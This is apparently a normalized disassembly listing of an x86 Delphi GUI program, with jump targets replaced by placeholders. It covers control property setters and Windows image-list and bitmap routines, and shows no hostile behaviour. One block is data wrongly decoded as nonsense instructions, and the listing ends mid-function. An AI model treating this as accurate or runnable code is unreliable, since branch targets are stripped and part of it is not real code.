mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_459630
sub_459318
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421864
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_45936c
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_4032a8
mov eax [ esi + 0x9c ]
call sub_4032a8
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_458c1c
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40d4f0
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_4593bc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_419008
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_4594c8
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_459528
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_459630
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_459818
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_459878
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_4598d4
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_459938
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_459468
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x95 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x95 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4188d4
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4188d4
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
sub_4594c8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_404444
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_40408c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403458
test eax eax
je r-xdata
sub_459528
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_459620
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_458f80
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403458
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_458f6c
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_459528
sub_459630
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403458
test eax eax
je r-xdata
sub_4596a8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x6c ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ ebx + 0x6c ] eax
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403458
test eax eax
je r-xdata
sub_459700
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x70 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x70 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4188d4
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4188d4
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
sub_459758
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_404444
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_40408c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4188d4
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4188d4
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
sub_4597c0
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403458
test eax eax
je r-xdata
sub_459818
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_404444
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_40408c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403458
test eax eax
je r-xdata
sub_459878
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403458
test eax eax
je r-xdata
sub_4598d4
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403458
test eax eax
je r-xdata
sub_459938
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4188d4
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403458
test eax eax
je r-xdata
sub_459998
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_404444
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_4214a0
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_4594c8
sub_4599e4
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_459a0c
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_458d88
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_459528
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_459a94
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x90 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebx + 0x90 ] eax
sub_459ac8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x90 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jg r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_459af8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41aa00
mov edi eax
mov eax esi
call sub_45ca78
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_459b24
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_459318
mov [ esi + 0x60 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_459b60
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_459ba4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_459bc9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459bd0
retn
sub_459c04
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
pushfd
inc ebp
add [ esp + ebx * 4 + 0x45 ] dl
add [ eax ] dl
add [ eax ] al
add [ eax - 0xfffbff0 ] dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x10045b7 ] al
add bh bh
push [ edi + esi * 4 + 0x540b0045 ]
inc ebx
push 0x65676e61
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add ecx [ 0x61724454 ]
ja r-xdata
insd
popad
push es
imul esi [ ebp + ecx * 2 + 0x61 ] 0x49076b73
insd
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
outsb
push ebx
je r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
push eax
popfd
inc ebp
popad
dec ecx
outsb
js r-xdata
inc ebp
add [ ecx ] al
or edx [ ecx + ecx * 2 + 0x6d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax - 0x64 ] ah
inc ebp
add [ edi ] al
jae r-xdata
add [ eax ] al
add [ esp + ebx * 4 + 0x69070045 ] dh
je r-xdata
outsd
arpl [ ebp + 0x73 ] si
or ah [ ebx + esi * 2 + 0x53 ]
insb
arpl [ gs : ebp + 0x64 ] si
or [ ebx + esi * 2 + 0x4e ] ah
outsd
jb r-xdata
add [ eax ] al
xchg esp eax
popfd
inc ebp
add [ ebp + ebx * 4 + 0x680045 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
or eax 0x72547364
popad
outsb
jae r-xdata
add [ eax ] al
test [ edi + 0x41 ] ch
add ah cl
push ss
inc edx
popfd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebx * 4 - 0x6263ffbb ] dl
inc ebp
add [ eax ] ch
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebx * 4 + 0x45 ] dh
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
mov eax eax
mov eax 0x300459c
or dl [ ecx + ecx * 2 + 0x6d ]
popad
push esp
jns r-xdata
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0x9cb8c08b
inc ebp
add [ ebx ] al
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0x34f80040 ] al
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ esi + ebx * 4 - 0x52afffbb ] bh
inc ebp
add al bl
mov al 0x45
add [ eax - 0x67ffba54 ] dl
adc eax [ edx ]
adc al [ fs : edx ]
test al 0x13
inc edx
add [ eax - 0x1bffbdec ] ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ esi + ebx * 4 ] bl
inc ebp
add [ eax + ebp * 4 - 0x60d7ffbb ] al
inc ebp
add [ ebp + esi * 4 - 0x49e7ffbb ] cl
inc ebp
add [ eax + 0x10045ae ] dl
add bh ch
jmp [ eax + 0x100045ae ]
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
sub_459e1c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420f48
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_459e68
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_420f48
mov [ edi + 0x34 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x30 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_459ebc
push ebx
push esi
push edi
call sub_403674
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_4189bc
mov edx eax
mov eax edi
call sub_45aef0
mov eax [ edi + 0x50 ]
call sub_4032a8
mov eax edi
call sub_45a218
mov eax [ edi + 0x4c ]
call sub_4032a8
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420f94
test bl bl
jle r-xdata
call sub_4032a8
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40365c
sub_459f28
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_459fd5
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_45ae78
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_459ff4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459fdc
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_459ff4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45a095
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_42aa80
mov eax ebx
call sub_429e14
mov eax [ eax + 0x14 ]
xor edx edx
call sub_424c70
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_417298
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_429e14
pop edx
call sub_4250a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a09c
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_45a0b8
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_459ff4
pop ecx
pop edx
pop ebx
retn
sub_45a0f0
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
retn
mov [ esi + 0x34 ] edx
mov eax esi
call sub_459fe0
test al al
je r-xdata
mov eax esi
call sub_45a818
mov eax esi
call sub_459ff4
mov eax esi
mov si 0xffef
call sub_4034a4
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_45a134
push esi
mov esi eax
cmp edx [ esi + 0x30 ]
je r-xdata
pop esi
retn
mov [ esi + 0x30 ] edx
mov eax esi
call sub_459fe0
test al al
je r-xdata
mov eax esi
call sub_45a818
mov eax esi
call sub_459ff4
mov eax esi
mov si 0xffef
call sub_4034a4
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_45a178
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45a218
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_45a0b8
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_4034a4
sub_45a1c4
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_45ae00
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_429e80
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45a218
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_459fe0
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_4034a4
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_45a1b4
push eax
call ImageList_Destroy
sub_45a250
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_45a2e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_459fe0
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a2ea
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov edx eax
mov eax ebx
call sub_45a824
sub_45a2f0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45a39f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45a382
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_459fe8
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45a1c4
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45a1c4
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a389
mov eax [ ebp - 0x10 ]
call sub_4032a8
retn
sub_45a3bc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45a4bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
push 0x0
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45a1c4
push eax
mov eax [ ebp - 0x4 ]
call sub_45a1b4
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a4c2
mov eax [ ebp - 0xc ]
